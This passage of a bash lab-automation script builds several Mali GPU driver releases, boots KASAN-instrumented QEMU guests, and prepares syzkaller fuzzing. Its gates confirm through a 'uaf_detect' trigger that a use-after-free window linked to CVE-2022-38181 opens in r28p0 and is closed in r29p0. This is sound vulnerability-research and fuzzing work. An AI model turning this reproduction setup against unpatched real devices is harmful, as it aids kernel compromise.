  # e.g. include/uapi/gpu into an inline-era run). The ownership manifests
  # only contain paths proven NON-pristine by the collision gate above, so
  # removal can never touch kernel-owned files.
  local own_files="$KT/.mali_driver_owned.files" own_dirs="$KT/.mali_driver_owned.dirs"
  if [ -f "$own_files" ]; then
    grep -E '\.(o|ko|cmd)$|Module\.symvers$' "$own_files" >> "$stale" || true
    while IFS= read -r f; do
      [ -n "$f" ] && rm -f "$KT/$f"
    done < "$own_files"
    # prune now-empty driver dirs, deepest first (never rmdir $KT itself)
    if [ -f "$own_dirs" ]; then
      tac "$own_dirs" | while IFS= read -r d; do
        [ -n "$d" ] && rmdir "$KT/$d" 2>/dev/null || true
      done
    fi
    log "driver: removed previous driver's owned paths ($(wc -l < "$own_files") files)"
  fi

  cp -a "$pk"/* "$KT/"
  # record this driver's ownership for the next integration (files + dirs)
  cp "$drvlst" "$own_files"
  ( cd "$pk" && find . -type d | sed 's|^\./||' | grep -v '^\.$' | LC_ALL=C sort ) > "$own_dirs"
  log "driver $short: guide-exact copy done ($(wc -l < "$drvlst") files; stale manifest $(wc -l < "$stale") entries)"

  gate "driver $short: MALI_RELEASE_NAME in tree Kbuild" \
    bash -c "grep -q 'MALI_RELEASE_NAME.*${short}-01eac0' '$KT/drivers/gpu/arm/midgard/Kbuild'"

  # wiring (idempotent): drivers/gpu/Makefile
  grep -q 'obj-\$(CONFIG_MALI_MIDGARD) += arm/' "$KT/drivers/gpu/Makefile" 2>/dev/null \
    || echo 'obj-$(CONFIG_MALI_MIDGARD) += arm/' >> "$KT/drivers/gpu/Makefile"
  gate "driver $short: drivers/gpu/Makefile wired (arm/)" \
    bash -c "[ \"\$(grep -c 'obj-\$(CONFIG_MALI_MIDGARD) += arm/' '$KT/drivers/gpu/Makefile')\" -eq 1 ]"

  # wiring (idempotent): drivers/video/Kconfig, anchored on the drm source
  grep -q 'source "drivers/gpu/arm/Kconfig"' "$KT/drivers/video/Kconfig" \
    || sed -i 's|source "drivers/gpu/drm/Kconfig"|source "drivers/gpu/drm/Kconfig"\nsource "drivers/gpu/arm/Kconfig"|' \
         "$KT/drivers/video/Kconfig"
  gate "driver $short: drivers/video/Kconfig wired (arm/Kconfig)" \
    bash -c "[ \"\$(grep -c 'source \"drivers/gpu/arm/Kconfig\"' '$KT/drivers/video/Kconfig')\" -eq 1 ]"

  # uapi-era gate: uapi-split drivers (r36p0/r41p0) must stage
  # include/uapi/gpu; inline-era drivers must not shadow it
  case "$short" in
    r36p0|r41p0)
      gate "driver $short: uapi-split headers staged (include/uapi/gpu)" \
        test -d "$KT/include/uapi/gpu";;
    r28p0|r29p0)
      gate "driver $short: inline-era (no include/uapi shadow in tree)" \
        bash -c "! test -d '$KT/include/uapi/gpu'";;
  esac
}

# =============================== STAGE: DRIVER ===============================
stage_driver() { # <ver>
  local ver="$1" short; short=$(drv_short "$ver")
  log "=== stage driver $ver (mode=$DRIVER_MODE, arch=$ARCH) ==="
  integrate_driver_tree "$ver"
  # clear stale objects from any previously-staged release (F4 lesson: stale
  # .o from another release breaks the build; also clear ar archives and
  # modpost outputs so builtin relinks cannot absorb old objects)
  find "$KT/drivers/gpu/arm/midgard" \
    \( -name '*.o' -o -name '*.ko' -o -name '*.a' -o -name '.*.cmd' \
       -o -name '.*.o.d' -o -name 'Module.symvers' -o -name 'modules.order' \) \
    -delete 2>/dev/null || true

  local mk=(make -C "$KT" ARCH="$KARCH")
  [ -n "$CROSS_COMPILE" ] && mk+=(CROSS_COMPILE="$CROSS_COMPILE")
  if [ "$DRIVER_MODE" = module ]; then
    log "building $short as loadable module (kernel image untouched)"
    "${mk[@]}" M="$KT/drivers/gpu/arm/midgard" modules \
      > "$LAB_ROOT/logs/bootstrap/driver_${short}_build.log" 2>&1 \
      || { tail -20 "$LAB_ROOT/logs/bootstrap/driver_${short}_build.log"; fail "module build failed for $short"; }
    gate "driver $short: mali_kbase.ko built" test -f "$KT/drivers/gpu/arm/midgard/mali_kbase.ko"
    mkdir -p "$LAB_ROOT/builds/modules"
    cp "$KT/drivers/gpu/arm/midgard/mali_kbase.ko" "$LAB_ROOT/builds/modules/mali_kbase_${short}.ko"
    sha256sum "$LAB_ROOT/builds/modules/mali_kbase_${short}.ko" >> "$LAB_ROOT/evidence/modules.sha256"
    gate "driver $short: .ko carries release identity string" \
      bash -c "strings '$LAB_ROOT/builds/modules/mali_kbase_${short}.ko' | grep -q '${short}-01eac0'"
  else
    log "building $short builtin (incremental relink of the one tree)"
    "${mk[@]}" -j"$KERNEL_JOBS" > "$LAB_ROOT/logs/bootstrap/driver_${short}_build.log" 2>&1 \
      || { tail -20 "$LAB_ROOT/logs/bootstrap/driver_${short}_build.log"; fail "builtin rebuild failed for $short"; }
    gate "driver $short: kernel image relinked ($KIMG_REL)" test -f "$KT/$KIMG_REL"
    sha256sum "$KT/$KIMG_REL" >> "$LAB_ROOT/evidence/kimage_states.sha256"
  fi
}

# ============================= STAGE: GUEST-TEST =============================
gen_release_uapi() { # <ver> — v2: uapi-split aware; NO rm -rf (payload files
                     # such as layout_check_*.c in $out must survive regen)
  local ver="$1" short; short=$(drv_short "$ver")
  local kinc; kinc=$(find "$(drv_src "$ver")" -type d -path '*driver/product/kernel' | head -1)
  [ -n "$kinc" ] || fail "kernel include root not found in $ver archive
  Stage the pristine archive and rerun:
    scp <refhost>:<path>/$(drv_archive "$ver") $STAGING_DIR/
  expected sha256: $(drv_hash "$ver")"
  local out="$LAB_ROOT/harness/release_uapi/$short"
  mkdir -p "$out/gpu/arm/midgard/jm" "$out/gpu/arm/midgard/gpu" \
           "$out/gpu/arm/midgard/gpu/backend" "$out/gpu/arm/midgard/csf" \
           "$out/base/arm/dma_buf_test_exporter"
  local f
  if [ -d "$kinc/include/uapi/gpu/arm/midgard" ]; then
    # uapi-split era (r36p0/r41p0): copy the WHOLE UAPI gpu tree, then add
    # driver-local extras the UAPI tree lacks (validated byte-exact vs the
    # reference release_uapi sets: r36p0 18 files, r41p0 19 files)
    cp -a "$kinc/include/uapi/gpu/." "$out/gpu/"
    for f in mali_kbase_mem_profile_debugfs_buf_size.h \
             gpu/backend/mali_kbase_gpu_regmap_csf.h; do
      if [ ! -f "$out/gpu/arm/midgard/$f" ]; then
        [ -f "$kinc/drivers/gpu/arm/midgard/$f" ] \
          || fail "release_uapi regen: missing driver-local $f in $ver archive"
        cp "$kinc/drivers/gpu/arm/midgard/$f" "$out/gpu/arm/midgard/$f"
      fi
    done
  else
    # inline era (r28p0/r29p0): the validated 15-file release list
    for f in mali_kbase_kinstr_jm_reader.h mali_kbase_ioctl.h \
             jm/mali_base_jm_kernel.h jm/mali_kbase_jm_ioctl.h \
             gpu/mali_kbase_gpu_coherency.h gpu/mali_kbase_gpu_id.h \
             gpu/backend/mali_kbase_gpu_regmap_jm.h gpu/backend/mali_kbase_gpu_regmap_csf.h \
             gpu/mali_kbase_gpu_regmap.h mali_kbase_hwcnt_reader.h \
             mali_kbase_mem_profile_debugfs_buf_size.h mali_base_mem_priv.h \
             csf/mali_kbase_csf_ioctl.h csf/mali_base_csf_kernel.h \
             mali_base_kernel.h; do
      [ -f "$kinc/drivers/gpu/arm/midgard/$f" ] || fail "release_uapi regen: missing drivers/gpu/arm/midgard/$f in $ver archive"
      cp "$kinc/drivers/gpu/arm/midgard/$f" "$out/gpu/arm/midgard/$f"
    done
  fi
  # dma-buf exporter header — location differs by era:
  # inline/uapi era ships include/linux/..., r41p0 uapi-split ships
  # include/uapi/base/arm/dma_buf_test_exporter/... (byte-verified)
  if [ -f "$kinc/include/linux/dma-buf-test-exporter.h" ]; then
    cp "$kinc/include/linux/dma-buf-test-exporter.h" "$out/base/arm/dma_buf_test_exporter/"
  elif [ -f "$kinc/include/uapi/base/arm/dma_buf_test_exporter/dma-buf-test-exporter.h" ]; then
    cp "$kinc/include/uapi/base/arm/dma_buf_test_exporter/dma-buf-test-exporter.h" \
       "$out/base/arm/dma_buf_test_exporter/"
  else
    fail "release_uapi regen: dma-buf-test-exporter.h not found (neither include/linux nor include/uapi/base) in $ver archive"
  fi
  gate "guest-test $short: release_uapi regenerated (>=16 files, ioctl+base_kernel present)" \
    bash -c "[ \$(find '$out' -type f -name '*.h' | wc -l) -ge 16 ] && test -f '$out/gpu/arm/midgard/mali_kbase_ioctl.h' && test -f '$out/gpu/arm/midgard/mali_base_kernel.h' && test -f '$out/base/arm/dma_buf_test_exporter/dma-buf-test-exporter.h'"
}
ensure_release_uapi() { # <ver> — idempotent wrapper for guest-test AND extract paths
  local ver="$1" short; short=$(drv_short "$ver")
  local out="$LAB_ROOT/harness/release_uapi/$short"
  if [ -f "$out/gpu/arm/midgard/mali_kbase_ioctl.h" ] \
     && [ "$(find "$out" -type f -name '*.h' | wc -l)" -ge 16 ]; then
    log "release_uapi $short present ($(find "$out" -type f -name '*.h' | wc -l) headers), keeping"
  else
    gen_release_uapi "$ver"
  fi
}

stage_guest_test() { # <ver>
  local ver="$1" short; short=$(drv_short "$ver")
  log "=== stage guest-test $ver (MALI_MODE=$MALI_MODE, ARCH=$ARCH) ==="

  # userspace tools (static; cross-compiled for arm64 guests)
  local cc="gcc"
  [ "$ARCH" = arm64 ] && cc="aarch64-linux-gnu-gcc"
  "$cc" -O2 -static -o "$LAB_ROOT/bin/kcov_test" "$LAB_ROOT/harness/common/kcov_test.c"

  # layout-check gates (host-compiled: validate the release UAPI struct
  # layouts themselves, not the target arch) — payload asserts; both the
  # JM and CSF checks must compile and pass
  if [ "$short" = r36p0 ]; then
    gcc -O2 -I "$LAB_ROOT/harness/release_uapi/r36p0" \
      "$LAB_ROOT/harness/release_uapi/r36p0/layout_check_r36p0.c" \
      -o "$LAB_ROOT/bin/layout_check_r36p0" \
      || fail "layout_check_r36p0.c failed to compile"
    gate "guest-test r36p0: JM layout check passes" "$LAB_ROOT/bin/layout_check_r36p0"
    gcc -O2 -DMALI_USE_CSF=1 -I "$LAB_ROOT/harness/release_uapi/r36p0" \
      "$LAB_ROOT/harness/release_uapi/r36p0/layout_check_r36p0_csf.c" \
      -o "$LAB_ROOT/bin/layout_check_r36p0_csf" \
      || fail "layout_check_r36p0_csf.c failed to compile"
    gate "guest-test r36p0: CSF layout check passes" "$LAB_ROOT/bin/layout_check_r36p0_csf"
  fi

  local uafbin="" mflags=""
  [ "$MALI_MODE" = csf ] && mflags="-DMALI_USE_CSF=1"
  case "$short" in
    r41p0)
      note "r41p0: uapi-split layout, uaf_detect oracle expectations never characterized — boot-only test"
      ;;
    *)
      # release headers regenerated from the pristine archive (idempotent;
      # uapi-split aware; payload layout_check files in $out survive regen)
      ensure_release_uapi "$ver"
      "$cc" -O2 -static -Wall $mflags -I "$LAB_ROOT/harness/release_uapi/$short" \
        "$LAB_ROOT/harness/uaf_detect/uaf_detect.c" -o "$LAB_ROOT/bin/uaf_detect_$short" \
        || fail "uaf_detect build failed for $short (MALI_MODE=$MALI_MODE)"
      uafbin="$LAB_ROOT/bin/uaf_detect_$short"
      gate "guest-test $short: uaf_detect built (release-matched headers, mode=$MALI_MODE)" test -x "$uafbin"
      ;;
  esac

  # KASAN liveness canary module (same kernel ABI)
  local can="$LAB_ROOT/harness/common/kasan_canary_419"
  mkdir -p "$can"
  [ -f "$can/kasan_canary.c" ] || fail "canary source missing"
  cat > "$can/Makefile" <<EOF_MAKECAN
obj-m += kasan_canary.o
KDIR ?= $KT
all:
	\$(MAKE) -C \$(KDIR) ARCH=$KARCH ${CROSS_COMPILE:+CROSS_COMPILE=$CROSS_COMPILE} M=\$(CURDIR) modules
clean:
	\$(MAKE) -C \$(KDIR) M=\$(CURDIR) clean
EOF_MAKECAN
  ( cd "$can" && make clean >/dev/null 2>&1 || true )
  make -C "$can" > "$LAB_ROOT/logs/bootstrap/canary_build.log" 2>&1 \
    || fail "canary module build failed"
  gate "guest-test: kasan_canary.ko built against lab kernel" test -f "$can/kasan_canary.ko"

  # driver module for module mode
  local ko=""
  if [ "$DRIVER_MODE" = module ]; then
    ko="$LAB_ROOT/builds/modules/mali_kbase_${short}.ko"
    [ -f "$ko" ] || fail "driver module missing: $ko (run driver stage)"
  fi

  # initramfs (busybox + canary + uaf_detect [+ driver .ko in module mode])
  build_initramfs "$short" "$uafbin" "$can/kasan_canary.ko" "$ko"

  # boot + oracle assertions
  local logf="$LAB_ROOT/logs/bootstrap/01_boot_$short.log"
  boot_guest "$LAB_ROOT/images/initramfs_$short.cpio.gz" "$logf"

  # ---- oracle wrapper: asserts EXPECTED values per kernel (harness never
  #      self-declares) — expectations from evidence/09 (r28p0), /10 (r29p0)
  grep -q "PHASE_F_DONE" "$logf" || fail "guest did not complete init (no PHASE_F_DONE)"
  GATES+=("PASS  guest $short: boot completed")
  gate "guest $short: release banner in dmesg" grep -q "Kernel DDK version ${short}-01eac0" "$logf"
  gate "guest $short: /dev/mali0 present" bash -c "! grep -q NO_MALI0_DEVICE '$logf' && grep -q 'mali0' '$logf'"
  gate "guest $short: KCOV reachable (nonzero PCs)" bash -c "grep -o 'KCOV_OK pcs=[0-9]*' '$logf' | sed 's/.*=//' | head -1 | awk '{exit !(\$1>0)}'"
  gate "guest $short: KASAN liveness canary fired" bash -c "[ \$(grep -c 'KASAN:' '$logf') -ge 1 ]"
  gate "guest $short: no kbase/mali KASAN reports (canary-only)" \
    bash -c "[ \$(grep 'KASAN:' '$logf' | grep -ci 'kbase\|mali' || true) -eq 0 ]"

  case "$short" in
    r28p0)
      gate "guest r28p0 ORACLE O1: MEM_FLAGS_CHANGE(DONT_NEED) accepted" grep -q "oracle_o1=accepted ret=0" "$logf"
      gate "guest r28p0 ORACLE O2: trigger shows FOREIGN (UAF window realized)" grep -q "content_result=FOREIGN" "$logf"
      gate "guest r28p0 ORACLE O2b: trigger-late shows NOT_ORIG" grep -q "content_result=NOT_ORIG" "$logf"
      ;;
    r29p0)
      gate "guest r29p0 ORACLE O1: MEM_FLAGS_CHANGE(DONT_NEED) rejected" grep -q "oracle_o1=rejected" "$logf"
      gate "guest r29p0 ORACLE O2: content INTACT in both variants (fix holds)" \
        bash -c "[ \$(grep -c 'content_result=INTACT' '$logf') -ge 2 ]"
      ;;
    r41p0)
      gate_soft "guest r41p0: observe-only boot evidence recorded" grep -q "PHASE_F_DONE" "$logf"
      ;;
    r36p0)
      # r36p0 is in the CVE-2022-38181 range but the oracle behavior was
      # never characterized — observe-only, evidence recorded for review
      gate_soft "guest r36p0: observe-only boot evidence recorded" grep -q "PHASE_F_DONE" "$logf"
      note "r36p0 oracle observe-only: review evidence/guest_test_r36p0.log (uaf_detect outputs recorded, not gated)"
      ;;
  esac
  cp "$logf" "$LAB_ROOT/evidence/guest_test_$short.log"
  set_stamp "guest_test_$short" "$short|$DRIVER_MODE|$MALI_MODE|$ARCH|$(sha256sum "$LAB_ROOT/images/initramfs_$short.cpio.gz" | awk '{print $1}')"
}

build_initramfs() { # <short> <uafbin|""> <canary.ko> <mali.ko|"">
  local short="$1" uafbin="$2" canary="$3" mali="$4"
  local stage="$LAB_ROOT/images/stage_$short"
  rm -rf "$stage"; mkdir -p "$stage"/{bin,proc,sys,dev,tmp}
  if [ "$ARCH" = arm64 ]; then
    cp "$LAB_ROOT/toolchains/arm64/busybox" "$stage/bin/busybox"
  else
    cp "$STAGING_DIR/busybox-x86_64" "$stage/bin/busybox"
  fi
  local l
  for l in sh mount ls cat grep head tail dmesg poweroff mkdir chmod sleep \
           insmod rmmod uname echo sync wc printf zcat; do
    ln -sf busybox "$stage/bin/$l"
  done
  install -m 0755 "$LAB_ROOT/bin/kcov_test" "$stage/kcov_test"
  [ -n "$uafbin" ] && install -m 0755 "$uafbin" "$stage/uaf_detect"
  install -m 0644 "$canary" "$stage/kasan_canary.ko"
  [ -n "$mali" ] && install -m 0644 "$mali" "$stage/mali_kbase.ko"
  echo "$short" > "$stage/rel_tag"

  cat > "$stage/init" <<'EOF_INIT'
#!/bin/busybox sh
export PATH=/bin:/sbin:/usr/bin:/usr/sbin
mount -t proc none /proc
mount -t sysfs none /sys
mount -t devtmpfs none /dev
mount -t debugfs none /sys/kernel/debug

echo "=== PHASE_F_BOOT ==="
uname -r; uname -m

if [ -e /mali_kbase.ko ]; then
  insmod /mali_kbase.ko; echo "mali insmod rc=$?"
  sleep 1
fi

echo "=== instrumented config check ==="
zcat /proc/config.gz | grep -E "^CONFIG_(KASAN|KASAN_GENERIC|KCOV|KCOV_INSTRUMENT_ALL|MALI_MIDGARD|MALI_NO_MALI|MALI_EXPERT)=" || echo CONFIG_CHECK_MISSING

echo "=== kbase release banner ==="
dmesg | grep -iE "Kernel DDK version|GPU identified|Using Dummy|model dummy|mali0" | head -6

echo "=== /dev/mali0 ==="
ls -l /dev/mali* 2>&1

echo "=== KCOV probe ==="
/kcov_test; echo "kcov_test rc=$?"

echo "=== KASAN liveness canary (expect reports) ==="
insmod /kasan_canary.ko; echo "canary insmod rc=$?"
dmesg | grep -c "KASAN:" || true

if [ -e /uaf_detect ]; then
  echo "=== uaf_detect smoke ==="
  /uaf_detect smoke; echo "smoke rc=$?"
  echo "=== uaf_detect trigger (variant A) ==="
  /uaf_detect trigger; echo "trigger rc=$?"
  echo "=== uaf_detect trigger-late (variant B) ==="
  /uaf_detect trigger-late; echo "trigger_late rc=$?"
else
  echo "=== no uaf_detect in image (boot-only test) ==="
fi

echo "=== dmesg tail ==="
dmesg | tail -8

echo "=== PHASE_F_DONE ==="
sync
poweroff -f
EOF_INIT
  chmod 0755 "$stage/init" "$stage/kcov_test"
  ( cd "$stage" && find . | cpio -o -H newc 2>/dev/null | gzip -9 > "$LAB_ROOT/images/initramfs_$short.cpio.gz" )
  gate "guest-test $short: initramfs built" test -s "$LAB_ROOT/images/initramfs_$short.cpio.gz"
}

boot_guest() { # <initrd> <logfile>
  local initrd="$1" logf="$2"
  # accel: env var if set (prereqs stage), else the stamp prereqs wrote, else kvm
  local kind="${QEMU_ACCEL:-$(cat "$LAB_ROOT/.stamps/qemu_accel" 2>/dev/null || echo kvm)}"
  local acc=()
  if [ "$kind" = kvm ]; then acc=(-enable-kvm -cpu host); else acc=(-accel tcg -cpu max); fi
  log "booting guest (ARCH=$ARCH, accel=${QEMU_ACCEL}) -> $logf"
  if [ "$ARCH" = arm64 ]; then
    # same -machine/-cpu/-dtb as the syzkaller qemu_args (config equivalence);
    # acpi=off per guide step 8 (DT-only probe path)
    timeout --kill-after=10 "$BOOT_TIMEOUT" qemu-system-aarch64 \
      "${acc[@]}" -machine virt,virtualization=on,gic-version=max -smp 2 -m 2048 \
      -kernel "$KT/arch/arm64/boot/Image" -dtb "$LAB_ROOT/images/virt_mali.dtb" \
      -initrd "$initrd" \
      -nographic -no-reboot \
      -append "console=ttyAMA0 rdinit=/init panic=1 loglevel=7 kasan_multi_shot=1 nokaslr acpi=off" \
      > "$logf" 2>&1 || true
  else
    timeout --kill-after=10 "$BOOT_TIMEOUT" qemu-system-x86_64 \
      "${acc[@]}" -smp 2 -m 2048 \
      -kernel "$KT/arch/x86/boot/bzImage" -initrd "$initrd" \
      -nographic -no-reboot \
      -append "console=ttyS0 rdinit=/init panic=1 loglevel=7 kasan_multi_shot=1 nokaslr" \
      > "$logf" 2>&1 || true
  fi
}

# ============================= STAGE: SYZKALLER ==============================
activate_desc() { # <short> — exactly one of the four mali descriptions active
  local sel="$1" b f
  for b in r28p0 r41p0 r36p0 r36p0_csf; do
    [ "$b" = "$sel" ] && continue
    for f in "dev_mali_$b.txt" "dev_mali_$b.txt.const"; do
      [ -f "$SZ/sys/linux/$f" ] && mv "$SZ/sys/linux/$f" "$SZ/sys/linux/$f.parked"
    done
  done
  for f in "dev_mali_$sel.txt" "dev_mali_$sel.txt.const"; do
    [ -f "$SZ/sys/linux/$f.parked" ] && mv "$SZ/sys/linux/$f.parked" "$SZ/sys/linux/$f"
  done
}

parse_compare_consts() { # <dshort> <ref_const> — semantic dual-arch gate:
  # (1) name sets identical, (2) extracted amd64 column == reference values,
  # (3) arm64 == amd64 for every non-__NR_* const (validated locally for
  # r28p0 vs the archived amd64-only ref and r41p0 vs the recovered Phase E
  # ref: 100% match, 0 missing/extra names)
  python3 - "$SZ/sys/linux/dev_mali_$1.txt.const" "$2" <<'EOF_PC'
import sys, re

def parse(path):
    vals, names = {}, set()
    for line in open(path):
        line = line.strip()
        if not line or line.startswith("#") or line.startswith("arches"):
            continue
        m = re.match(r'^([A-Za-z0-9_]+) = (.*)$', line)
        if not m:
            continue
        name, rhs = m.group(1), m.group(2)
        names.add(name)
        d = {}
        if ("," in rhs) or (":" in rhs):
            for part in rhs.split(","):
                part = part.strip()
                if ":" in part:
                    a, v = part.split(":", 1)
                    d[a.strip()] = v.strip()
                else:
                    d["default"] = part
        else:
            d["default"] = rhs
        vals[name] = d
    return vals, names

nval, nname = parse(sys.argv[1])
rval, rname = parse(sys.argv[2])
if nname != rname:
    print("name drift: only-new=%s only-ref=%s"
          % (sorted(nname - rname)[:8], sorted(rname - nname)[:8]))
    sys.exit(1)
bad = []
for n in sorted(nname):
    nv = nval[n].get("amd64", nval[n].get("default"))
    rv = rval[n].get("amd64", rval[n].get("default"))
    if nv != rv:
        bad.append((n, rv, nv))
if bad:
    print("amd64 mismatch (%d): %s" % (len(bad), bad[:8]))
    sys.exit(1)
bad2 = []
for n in sorted(nname):
    if n.startswith("__NR_"):
        continue
    a64 = nval[n].get("arm64", nval[n].get("default"))
    a86 = nval[n].get("amd64", nval[n].get("default"))
    if a64 != a86:
        bad2.append((n, a86, a64))
if bad2:
    print("arm64!=amd64 outside __NR_ (%d): %s" % (len(bad2), bad2[:8]))
    sys.exit(1)
print("parse-compare OK: %d names" % len(nname))
EOF_PC
}

extract_consts() { # <dshort> — dual-arch extraction, per-desc includedirs,
                   # arch-aware reference gates (validated 6-run matrix)
  local dshort="$1"
  log "extracting $dshort consts (dual-arch: -build -arch amd64,arm64)"
  local ov="$LAB_ROOT/builds/extract_sourcedir_mali"

  # hardlink mirror of the ONE kernel tree, rebuilt whenever the tree state
  # changes (kernel/driver/mode); surgery is mirror-only — the real tree is
  # never written (gate below)
  local mkey="$KERNEL_VERSION|$ARCH|$DRIVER_VERSION|$DRIVER_MODE|$MALI_MODE"
  if [ ! -d "$ov/include" ] || [ "$(cat "$ov/.mirror_key" 2>/dev/null)" != "$mkey" ]; then
    rm -rf "$ov"         # never nest a partial mirror inside an existing dir
    cp -al "$KT" "$ov" || fail "extract: mirror cp -al failed (mirror must be on the same filesystem as $KT)"
  fi
  rm -rf "$ov/include/uapi/gpu"          # staged-driver uapi shadow: the
                                         # release_uapi headers are the only
                                         # UAPI source (validated in all 6 runs)
  rm -f "$ov/.config" "$ov/init/main.o"  # markers: skip syz-extract's mrproper
  rm -rf "$ov/include/config" "$ov/include/generated" \
         "$ov/arch/x86/include/generated" "$ov/arch/arm64/include/generated" 2>/dev/null
  # gcc>=14/-Werror: 5.10 vendored subcmd trips -Werror=use-after-free while
  # building tools/objtool (needed by x86_64 init/main.o). Mirror-only sed -i
  # breaks the hardlink; the real tree stays untouched.
  sed -i 's/ -Werror//g' "$ov/tools/objtool/Makefile" \
                         "$ov/tools/lib/subcmd/Makefile" 2>/dev/null || true
  printf '%s' "$mkey" > "$ov/.mirror_key"
  gate "extract: real tree intact after mirror surgery" \
    bash -c "test -f '$KT/Makefile' && test -d '$KT/include/generated' && ! test -d '$ov/include/generated'"

  # per-desc includedirs (r28p0: extract-shim FIRST so the inline-era
  # mali_base_kernel.h resolves through the compat block; r36p0_csf:
  # mode-csf FIRST — its mali_use_csf.h sets MALI_USE_CSF for the UAPI set)
  local incs
  case "$dshort" in
    r28p0)
      local shim="$LAB_ROOT/builds/extract_shim_r28p0"
      rm -rf "$shim"; mkdir -p "$shim/gpu/arm/midgard"
      sed "s|@LAB@|$LAB_ROOT|g" "$LAB_ROOT/fuzzing/syzkaller/shim_mali_base_kernel.h.in" \
        > "$shim/gpu/arm/midgard/mali_base_kernel.h"
      incs="$shim,$LAB_ROOT/harness/release_uapi/r28p0";;
    # release_uapi dirs are named by drv_short (r41p0 — generated set is
    # byte-identical to the reference r41p0-01eac0 set: uapi tree + uapi-path
    # dma-buf header, 19 files, Phase H validated)
    r41p0)     incs="$LAB_ROOT/harness/release_uapi/r41p0";;
    r36p0)     incs="$LAB_ROOT/harness/release_uapi/r36p0";;
    r36p0_csf) incs="$LAB_ROOT/harness/release_uapi/mode-csf,$LAB_ROOT/harness/release_uapi/r36p0";;
    *) fail "extract_consts: unknown desc $dshort";;
  esac

  # release headers from the pristine archive (idempotent) for the desc's driver
  case "$dshort" in
    r28p0|r29p0) ensure_release_uapi r28p0-01eac0;;
    r41p0)       ensure_release_uapi r41p0-01eac0;;
    r36p0|r36p0_csf) ensure_release_uapi r36p0-01eac0;;
  esac

  # syz-extract binary: prebuilt may be missing in a fresh clone → go install
  if [ ! -x "$SZ/bin/syz-extract" ]; then
    ( cd "$SZ" && GOBIN="$SZ/bin" go install ./sys/syz-extract ) \
      || fail "syz-extract build failed (no prebuilt bin/syz-extract and go install failed)"
  fi

  # single-desc parking (syz-extract parses ALL of sys/linux/*.txt — duplicate
  # mali type/syscall declarations are fatal), meta noextract strip, extract,
  # exact restore (cp -p backup + mv, byte-exact incl. mtime)
  local desc="dev_mali_$dshort.txt"
  activate_desc "$dshort"
  cp -p "$SZ/sys/linux/$desc" "$SZ/sys/linux/$desc.pristine"
  sed '/^meta noextract$/d' "$SZ/sys/linux/$desc" > "$SZ/sys/linux/$desc.tmp" \
    && mv "$SZ/sys/linux/$desc.tmp" "$SZ/sys/linux/$desc"
  local p f
  for p in "$SZ/sys/linux"/dev_mali_*.txt; do
    f="$(basename "$p")"
    [ "$f" = "$desc" ] || mv "$p" "$p.runpark" || true
  done
  local rc=0
  ( cd "$SZ" && bin/syz-extract -build -arch amd64,arm64 -sourcedir "$ov" \
      -includedirs "$incs" "$desc" ) \
    > "$LAB_ROOT/logs/bootstrap/syz_extract_${dshort}.log" 2>&1 || rc=$?
  local p f
  for p in "$SZ/sys/linux"/dev_mali_*.txt.runpark; do
    [ -e "$p" ] && mv "$p" "${p%.runpark}"
  done
  mv -f "$SZ/sys/linux/$desc.pristine" "$SZ/sys/linux/$desc"
  [ $rc -eq 0 ] || fail "syz-extract failed for $dshort (logs/bootstrap/syz_extract_${dshort}.log)"

  gate "extract $dshort: 0 undefined consts" \
    bash -c "! grep -q '???' '$SZ/sys/linux/dev_mali_$dshort.txt.const'"
  gate "extract $dshort: dual-arch const header" \
    grep -q '^arches = amd64, arm64' "$SZ/sys/linux/dev_mali_$dshort.txt.const"

  # reference gate semantics (Phase H decision):
  #   r36p0/r36p0_csf refs = the validated 5.10-derived dual consts
  #     (byte-identical across 4.19/5.10 extraction trees — proven) → byte-cmp
  #   r28p0/r41p0 refs: parse-compare (amd64 column vs ref values + arm64
  #     consistency) — r28p0's ref stays the archived amd64-only Phase F
  #     extraction; r41p0's ref is the new dual-arch const
  local ref="$LAB_ROOT/fuzzing/syzkaller/refs/dev_mali_$dshort.txt.const"
  case "$dshort" in
    r36p0|r36p0_csf)
      gate "extract $dshort: const byte-identical to validated 5.10-derived reference" \
        cmp -s "$SZ/sys/linux/dev_mali_$dshort.txt.const" "$ref";;
    r28p0|r41p0)
      local pc_rc=0
      parse_compare_consts "$dshort" "$ref" \
        > "$LAB_ROOT/logs/bootstrap/parse_compare_${dshort}.log" 2>&1 || pc_rc=$?
      [ "$pc_rc" -eq 0 ] || cat "$LAB_ROOT/logs/bootstrap/parse_compare_${dshort}.log" >&2
      gate "extract $dshort: parse-compare vs reference (amd64 column + arm64 consistency)" \
        test "$pc_rc" -eq 0
      ;;
  esac
}

stage_syzkaller() {
  local dshort; dshort=$(drv_desc "$DRIVER_VERSION")
  log "=== stage syzkaller (desc=$dshort, ARCH=$ARCH) ==="
  export PATH="$LAB_ROOT/toolchains/go/bin:$PATH"
  export GOCACHE="$LAB_ROOT/.gocache" GOTMPDIR="$LAB_ROOT/.gotmp" GOMODCACHE="$LAB_ROOT/.gomodcache"
  mkdir -p "$GOTMPDIR" "$GOCACHE" "$GOMODCACHE"
  unset GOFLAGS || true

  gate "syzkaller: description files present" test -f "$SZ/sys/linux/dev_mali_$dshort.txt"
  extract_consts "$dshort"

  log "sysgen (description compile)"
  ( cd "$SZ" && GOBIN="$SZ/bin" go install ./sys/syz-sysgen ) \
    || fail "syz-sysgen build failed"
  ( cd "$SZ" && bin/syz-sysgen ) > "$LAB_ROOT/logs/bootstrap/sysgen.log" 2>&1 \
    || fail "syz-sysgen failed (logs/bootstrap/sysgen.log)"
  gate "syzkaller: sysgen rc=0 (executor/syscalls.h generated)" \
    bash -c "test -s '$SZ/executor/syscalls.h' && test -s '$SZ/executor/defs.h'"

  log "building host tools + executor (GitRevision via make; executor static-pie)"
  # host tools always build native; the executor targets the GUEST arch
  # (TARGETVMARCH := TARGETGOARCH — without it syz-make prints
  # NO_CROSS_COMPILER and skips the executor entirely)
  ( cd "$SZ" && make -j"$KERNEL_JOBS" manager repro execprog prog2c ) \
    > "$LAB_ROOT/logs/bootstrap/syz_make.log" 2>&1 || fail "make tools failed (logs/bootstrap/syz_make.log)"
  if [ "$ARCH" = arm64 ]; then
    ( cd "$SZ" && make TARGETOS=linux TARGETARCH=arm64 TARGETVMARCH=arm64 executor ) \
      >> "$LAB_ROOT/logs/bootstrap/syz_make.log" 2>&1 || fail "executor build failed (arm64; needs aarch64-linux-gnu-g++)"
    gate "syzkaller: executor is aarch64 static-pie" \
      bash -c "file '$SZ/bin/linux_arm64/syz-executor' | grep -q aarch64 && file '$SZ/bin/linux_arm64/syz-executor' | grep -q static-pie"
